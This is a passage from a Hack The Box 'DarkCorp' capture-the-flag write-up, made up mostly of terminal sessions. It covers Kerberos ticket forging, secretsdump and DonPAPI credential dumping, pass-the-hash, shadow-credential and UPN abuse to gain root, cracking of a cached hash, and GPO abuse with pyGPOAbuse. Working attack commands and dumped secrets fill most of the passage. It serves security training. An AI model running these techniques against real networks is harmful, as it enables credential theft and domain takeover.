DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(days=int(self.__options.duration))</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">/usr/local/bin/ticketer.py:529: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encRepPart[<span class="string">&#x27;last-req&#x27;</span>][0][<span class="string">&#x27;lr-value&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator.ccache</span><br><span class="line">                                                                                                 </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/ligolo]</span><br><span class="line">â””â”€$ <span class="built_in">export</span> KRB5CCNAME=$(<span class="built_in">readlink</span> -f ./Administrator.ccache)</span><br><span class="line">                                                                                                 </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/ligolo]</span><br><span class="line">â””â”€$ KRB5CCNAME=Administrator.ccache secretsdump.py -dc-ip 172.16.20.1 -k Administrator@web-01.darkcorp.htb -no-pass  -debug</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.12/site-packages/impacket</span><br><span class="line">[+] Using Kerberos Cache: Administrator.ccache</span><br><span class="line">[+] Domain retrieved from CCache: DARKCORP.HTB</span><br><span class="line">[+] Returning cached credential <span class="keyword">for</span> CIFS/WEB-01.DARKCORP.HTB@DARKCORP.HTB</span><br><span class="line">[+] Using TGS from cache</span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[+] Retrieving class info <span class="keyword">for</span> JD</span><br><span class="line">[+] Retrieving class info <span class="keyword">for</span> Skew1</span><br><span class="line">[+] Retrieving class info <span class="keyword">for</span> GBG</span><br><span class="line">[+] Retrieving class info <span class="keyword">for</span> Data</span><br><span class="line">[*] Target system bootKey: 0x4cf6d0e998d53752d088e233abb4bed6</span><br><span class="line">[+] Checking NoLMHash Policy</span><br><span class="line">[+] LMHashes are NOT being stored</span><br><span class="line">[+] Saving remote SAM database</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">[+] Calculating HashedBootKey from SAM</span><br><span class="line">[+] NewStyle hashes is: True</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::</span><br><span class="line">[+] NewStyle hashes is: True</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] NewStyle hashes is: True</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] NewStyle hashes is: True</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] Saving remote SECURITY database</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">[+] Decrypting LSA Key</span><br><span class="line">[+] Decrypting NL<span class="variable">$KM</span></span><br><span class="line">[+] Looking into NL<span class="variable">$1</span></span><br><span class="line">DARKCORP.HTB/svc_acc:$DCC2<span class="variable">$10240</span><span class="comment">#svc_acc#3a5485946a63220d3c4b118b36361dbb: (2025-02-14 20:10:51)</span></span><br><span class="line">[+] Looking into NL<span class="variable">$2</span></span><br><span class="line">[+] Looking into NL<span class="variable">$3</span></span><br><span class="line">[+] Looking into NL<span class="variable">$4</span></span><br><span class="line">[+] Looking into NL<span class="variable">$5</span></span><br><span class="line">[+] Looking into NL<span class="variable">$6</span></span><br><span class="line">[+] Looking into NL<span class="variable">$7</span></span><br><span class="line">[+] Looking into NL<span class="variable">$8</span></span><br><span class="line">[+] Looking into NL<span class="variable">$9</span></span><br><span class="line">[+] Looking into NL<span class="variable">$10</span></span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[+] Looking into <span class="variable">$MACHINE</span>.ACC</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC </span><br><span class="line">[+] Could not calculate machine account Kerberos keys, only printing plain password (hex encoded)</span><br><span class="line">darkcorp\WEB-01$:plain_password_hex:4100520044006c002600710072005a00640022007400230061003d004f00520063005e006b006e004f005d00270034004b0041003a003900390074006200320031006a0040005a004f004f005c004b003b00760075006600210063004f0075002f003c0072005d0043004c004a005800250075006c002d00440064005f006b00380038002c00270049002c0046004000680027003b004500200021003b0042004d005f0064003b0066002300700068005500440069002f0054002300320022005f004c0056004c003c0049006f002600480076002c005d00610034005500470077004a0076005f003400740054004800</span><br><span class="line">darkcorp\WEB-01$:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::</span><br><span class="line">[+] Looking into DPAPI_SYSTEM</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x1004cecdc9b33080d25a4a29126d4590eb555c5f</span><br><span class="line">dpapi_userkey:0x7f3f9f871ea1dafaea01ae4ccf6e3f7ee535e472</span><br><span class="line">[+] Looking into NL<span class="variable">$KM</span></span><br><span class="line">[*] NL<span class="variable">$KM</span> </span><br><span class="line"> 0000   DD C9 21 14 B9 23 69 1B  D8 BE FD 57 6B 3C 3E E1   ..!..<span class="comment">#i....Wk&lt;&gt;.</span></span><br><span class="line"> 0010   9D 3D 3F 74 82 AF 75 33  FD 74 61 6E B7 24 55 AF   .=?t..u3.tan.<span class="variable">$U</span>.</span><br><span class="line"> 0020   6F 61 A0 BC 2B 2A 86 CF  6E EC E0 D3 37 98 FE E5   oa..+*..n...7...</span><br><span class="line"> 0030   14 54 7D A9 A6 45 19 37  F1 20 24 4B 18 43 19 72   .T&#125;..E.7. <span class="variable">$K</span>.C.r</span><br><span class="line">NL<span class="variable">$KM</span>:ddc92114b923691bd8befd576b3c3ee19d3d3f7482af7533fd74616eb72455af6f61a0bc2b2a86cf6eece0d33798fee514547da9a6451937f120244b18431972</span><br><span class="line">[+] Exiting NTDSHashes.dump() because SAMR SessionError: code: 0xc00000df - STATUS_NO_SUCH_DOMAIN - The specified domain did not exist.</span><br><span class="line">[*] Cleaning up... </span><br><span class="line">[*] Stopping service RemoteRegistry</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And we can get the root flag:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u Administrator -i 172.16.20.2 -H 88d84ec08dad123eb04a060a74053f21</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>This machine made me so tired that I forgot to get the user flag lol. But here;s the solution for it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ KRB5CCNAME=Administrator.ccache DonPAPI collect -u <span class="string">&#x27;Administrator&#x27;</span> -k --no-pass -t web-01.darkcorp.htb -c CredMan</span><br><span class="line">[ðŸ’€] [+] DonPAPI Version 2.0.1</span><br><span class="line">[ðŸ’€] [+] Output directory at /home/kali/.donpapi</span><br><span class="line">[ðŸ’€] [+] Loaded 1 targets</span><br><span class="line">[ðŸ’€] [+] Recover file available at /home/kali/.donpapi/recover/recover_1739615883</span><br><span class="line">[WEB-01.darkcorp.htb] [+] Starting gathering credz</span><br><span class="line">[WEB-01.darkcorp.htb] [+] Dumping SAM</span><br><span class="line">DonPAPI running against 1 targets â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”   0% -:--:--</span><br><span class="line">[WEB-01.darkcorp.htb] [$] [SAM] Got 4 accounts</span><br><span class="line">[WEB-01.darkcorp.htb] [+] Dumping LSA</span><br><span class="line">[WEB-01.darkcorp.htb] [+] Dumping User and Machine masterkeys</span><br><span class="line">[WEB-01.darkcorp.htb] [$] [DPAPI] Got 4 masterkeys</span><br><span class="line">[WEB-01.darkcorp.htb] [+] Dumping User and Machine Credential Manager</span><br><span class="line">[WEB-01.darkcorp.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:&#123;7D87899F-85ED-49EC-B9C3-8249D246D1D6&#125; - WEB-01\Administrator:But_Lying_Aid9!</span><br><span class="line">DonPAPI running against 1 targets â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 100% 0:00:00</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:But_Lying_Aid9!</span><br></pre></td></tr></table></figure></div>

<p>Dump the next set of DPAPI-protected creds:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ DonPAPI collect -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;But_Lying_Aid9!&#x27;</span> -t web-01.darkcorp.htb -c CredMan</span><br><span class="line">[ðŸ’€] [+] DonPAPI Version 2.0.1</span><br><span class="line">[ðŸ’€] [+] Output directory at /home/kali/.donpapi</span><br><span class="line">[ðŸ’€] [+] Loaded 1 targets</span><br><span class="line">[ðŸ’€] [+] Recover file available at /home/kali/.donpapi/recover/recover_1739616325</span><br><span class="line">[web-01.darkcorp.htb] [+] Starting gathering credz</span><br><span class="line">[web-01.darkcorp.htb] [+] Dumping SAM</span><br><span class="line">[web-01.darkcorp.htb] [$] [SAM] Got 4 accounts</span><br><span class="line">[web-01.darkcorp.htb] [+] Dumping LSA</span><br><span class="line">[web-01.darkcorp.htb] [+] Dumping User and Machine masterkeys</span><br><span class="line">[web-01.darkcorp.htb] [$] [DPAPI] Got 5 masterkeys</span><br><span class="line">[web-01.darkcorp.htb] [+] Dumping User and Machine Credential Manager</span><br><span class="line">[web-01.darkcorp.htb] [$] [CredMan] [Administrator] LegacyGeneric:target=WEB-01 - Administrator:Pack_Beneath_Solid9!</span><br><span class="line">[web-01.darkcorp.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:&#123;7D87899F-85ED-49EC-B9C3-8249D246D1D6&#125; - WEB-01\Administrator:But_Lying_Aid9!</span><br><span class="line">DonPAPI running against 1 targets â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” 100% 0:00:00</span><br><span class="line">                                </span><br></pre></td></tr></table></figure></div>

<p>spray the password <code>Pack_Beneath_Solid9!</code><br>use <code>john.w</code>â€˜s <code>GenericWrite</code> to make shadow credentials for <code>angela.w</code>:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ bloodyAD --host dc-01 -u john.w -p <span class="string">&#x27;Pack_Beneath_Solid9!&#x27;</span> -d darkcorp.htb add shadowCredentials angela.w</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[+] Certificate generated</span><br><span class="line">[*] Generating KeyCredential</span><br><span class="line">[+] KeyCredential generated with following sha256 of RSA key: 4fe63e52b7ca1f17692fef5cc43b074007024be2831665b3f6411292c24ad001</span><br><span class="line">[*] Updating the msDS-KeyCredentialLink attribute of angela.w</span><br><span class="line">[+] msDS-KeyCredentialLink attribute of the target object updated</span><br><span class="line">No outfile path was provided. The certificate(s) will be stored with the filename: 6GkSe7QR</span><br><span class="line">[+] Saved PEM certificate at path: 6GkSe7QR_cert.pem</span><br><span class="line">[+] Saved PEM private key at path: 6GkSe7QR_priv.pem</span><br><span class="line">A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</span><br><span class="line">Run the following <span class="built_in">command</span> to obtain a TGT:</span><br><span class="line">python3 PKINITtools/gettgtpkinit.py -cert-pem 6GkSe7QR_cert.pem -key-pem 6GkSe7QR_priv.pem darkcorp.htb/angela.w 6GkSe7QR.ccache</span><br><span class="line">                                                                                                 </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ <span class="built_in">ls</span></span><br><span class="line"> 20250215041458_BloodHound.zip   jqqvtnad.ccache     ligolo          <span class="string">&#x27;WEB-01$.ccache&#x27;</span></span><br><span class="line"> 6GkSe7QR_cert.pem               jqqvtnad_cert.pem   PetitPotam      <span class="string">&#x27;WEB-01$.pfx&#x27;</span></span><br><span class="line"> 6GkSe7QR_priv.pem               jqqvtnad_priv.pem   SharpHound.exe   web-01.ccache</span><br><span class="line"> Administrator.ccache            krbrelayx           SharpHound.ps1   WEB-01.ccache</span><br><span class="line">                                                                                                 </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ python3 PKINITtools/gettgtpkinit.py -cert-pem 6GkSe7QR_cert.pem -key-pem 6GkSe7QR_priv.pem darkcorp.htb/angela.w  angela.w.ccache</span><br><span class="line">python3: can<span class="string">&#x27;t open file &#x27;</span>/home/kali/Hackthebox/DarkCorp/PKINITtools/gettgtpkinit.py<span class="string">&#x27;: [Errno 2] No such file or directory</span></span><br><span class="line"><span class="string">                                                                                                 </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span></span><br><span class="line"><span class="string">â””â”€$ python3 ../../PKINITtools/gettgtpkinit.py -cert-pem 6GkSe7QR_cert.pem -key-pem 6GkSe7QR_priv.pem darkcorp.htb/angela.w  angela.w.ccache</span></span><br><span class="line"><span class="string">2025-02-15 13:22:21,234 minikerberos INFO     Loading certificate and key from file</span></span><br><span class="line"><span class="string">INFO:minikerberos:Loading certificate and key from file</span></span><br><span class="line"><span class="string">2025-02-15 13:22:21,243 minikerberos INFO     Requesting TGT</span></span><br><span class="line"><span class="string">INFO:minikerberos:Requesting TGT</span></span><br><span class="line"><span class="string">2025-02-15 13:22:21,999 minikerberos INFO     AS-REP encryption key (you might need this later):</span></span><br><span class="line"><span class="string">INFO:minikerberos:AS-REP encryption key (you might need this later):</span></span><br><span class="line"><span class="string">2025-02-15 13:22:21,999 minikerberos INFO     b15ab24d0f43ba8c228cf33d0d41577f2b523aabb1a807c3aed1d2423be14679</span></span><br><span class="line"><span class="string">INFO:minikerberos:b15ab24d0f43ba8c228cf33d0d41577f2b523aabb1a807c3aed1d2423be14679</span></span><br><span class="line"><span class="string">2025-02-15 13:22:22,001 minikerberos INFO     Saved TGT to file</span></span><br><span class="line"><span class="string">INFO:minikerberos:Saved TGT to file</span></span><br><span class="line"><span class="string">                                                                                                 </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span></span><br><span class="line"><span class="string">â””â”€$ KRB5CCNAME=angela.w.ccache python3 ../../PKINITtools/getnthash.py -key KEY_FROM_SHADOWCREDS &#x27;</span>darkcorp.htb/angela.w<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Using TGT from cache</span></span><br><span class="line"><span class="string">[*] Requesting ticket to self with PAC</span></span><br><span class="line"><span class="string">[-] Non-hexadecimal digit found</span></span><br><span class="line"><span class="string">                                                                                                 </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span></span><br><span class="line"><span class="string">â””â”€$ KRB5CCNAME=angela.w.ccache python3 ../../PKINITtools/getnthash.py -key 4fe63e52b7ca1f17692fef5cc43b074007024be2831665b3f6411292c24ad001  &#x27;</span>darkcorp.htb/angela.w<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Using TGT from cache</span></span><br><span class="line"><span class="string">[*] Requesting ticket to self with PAC</span></span><br><span class="line"><span class="string">[-] ciphertext integrity failure</span></span><br><span class="line"><span class="string">                                                                                                 </span></span><br><span class="line"><span class="string">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span></span><br><span class="line"><span class="string">â””â”€$ KRB5CCNAME=angela.w.ccache python3 ../../PKINITtools/getnthash.py -key b15ab24d0f43ba8c228cf33d0d41577f2b523aabb1a807c3aed1d2423be14679  &#x27;</span>darkcorp.htb/angela.w<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Using TGT from cache</span></span><br><span class="line"><span class="string">[*] Requesting ticket to self with PAC</span></span><br><span class="line"><span class="string">Recovered NT Hash</span></span><br><span class="line"><span class="string">957246c8137069bca672dc6aa0af7c7a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>


<p><a class="link"   target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/" >https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Set <code>angela.w</code>â€˜s UPN to <code>angela.w.adm</code>, and solicit a new TGT of principal type NT_ENTERPRISE:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ bloodyAD --host dc-01 -d darkcorp.htb -u john.w -p <span class="string">&#x27;Pack_Beneath_Solid9!&#x27;</span> <span class="built_in">set</span> object <span class="string">&#x27;CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb&#x27;</span> userPrincipalName -v angela.w.adm</span><br><span class="line">[+] CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb<span class="string">&#x27;s userPrincipalName has been updated</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ impacket-getTGT -hashes :957246c8137069bca672dc6aa0af7c7a -principalType NT_ENTERPRISE darkcorp.htb/angela.w.adm</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> angela.w.adm.ccache</span><br><span class="line">                                           </span><br></pre></td></tr></table></figure></div>

<p><code>ksu</code> to <code>angela.w.adm</code> and then <code>su</code> to <code>root@drip.htb</code>:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ ssh ebelford@drip.htb                     </span><br><span class="line">ebelford@drip.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">You have no mail.</span></span><br><span class="line"><span class="string">Last login: Sat Feb 15 04:33:58 2025 from 172.16.20.1</span></span><br><span class="line"><span class="string">ebelford@drip:~$ ls</span></span><br><span class="line"><span class="string">agent  angela.w.adm.ccache</span></span><br><span class="line"><span class="string">ebelford@drip:~$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm</span></span><br><span class="line"><span class="string">Authenticated angela.w.adm@DARKCORP.HTB</span></span><br><span class="line"><span class="string">Account angela.w.adm: authorization for angela.w.adm@DARKCORP.HTB successful</span></span><br><span class="line"><span class="string">Changing uid to angela.w.adm (1730401107)</span></span><br><span class="line"><span class="string">angela.w.adm@drip:/home/ebelford$ id</span></span><br><span class="line"><span class="string">uid=1730401107(angela.w.adm) gid=1730400513(domain users) groups=1730400513(domain users),1730401109(linux_admins)</span></span><br><span class="line"><span class="string">angela.w.adm@drip:/home/ebelford$ sudo su </span></span><br><span class="line"><span class="string">root@drip:/home/ebelford# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@drip:/home/ebelford# </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@drip:/home/ebelford<span class="comment"># strings /var/lib/sss/db/cache_darkcorp.htb.ldb | grep &#x27;\$6&#x27; | sed &#x27;s/.*\$6/\$6/&#x27; | sed &#x27;s/\\00.*//&#x27; | sort | uniq</span></span><br><span class="line">$6$5wwc6mW6nrcRD4Uu<span class="variable">$9rigmpKLyqH</span>/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.</span><br><span class="line">root@drip:/home/ebelford<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp]</span><br><span class="line">â””â”€$ john  -w=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">!QAZzaq1         (?)     </span><br><span class="line">1g 0:00:00:26 DONE (2025-02-15 13:29) 0.03818g/s 3802p/s 3802c/s 3802C/s 020180..thunder22</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<p>establish and link a new GPO because we have are a member of GPO_MANAGER with taylor:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/pyGPOAbuse]</span><br><span class="line">â””â”€$ python3 pygpoabuse.py darkcorp.htb/taylor.b.adm:<span class="string">&#x27;!QAZzaq1&#x27;</span> -gpo-id 652CAE9A-4BB7-49F2-9E52-3361F33CE786 -<span class="built_in">command</span> <span class="string">&#x27;net localgroup Administrators DARKCORP.HTB\taylor.b.adm /add&#x27;</span> -taskname <span class="string">&quot;LocalAdmin&quot;</span> -description <span class="string">&quot;pop&quot;</span> -dc-ip 172.16.20.1 -v</span><br><span class="line">/home/kali/Hackthebox/DarkCorp/pyGPOAbuse/pygpoabuse/scheduledtask.py:54: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\%&#x27;</span></span><br><span class="line">  self._task_str = f<span class="string">&quot;&quot;</span><span class="string">&quot;&lt;ImmediateTaskV2 clsid=&quot;</span>&#123;&#123;9756B581-76EC-4169-9AFC-0CA8D43ADB5F&#125;&#125;<span class="string">&quot; name=&quot;</span>&#123;self._name&#125;<span class="string">&quot; image=&quot;</span>0<span class="string">&quot; changed=&quot;</span>&#123;self._mod_date&#125;<span class="string">&quot; uid=&quot;</span>&#123;&#123;&#123;self._guid&#125;&#125;&#125;<span class="string">&quot;&gt;&lt;Properties action=&quot;</span>C<span class="string">&quot; name=&quot;</span>&#123;self._name&#125;<span class="string">&quot; runAs=&quot;</span>%LogonDomain%\%LogonUser%<span class="string">&quot; 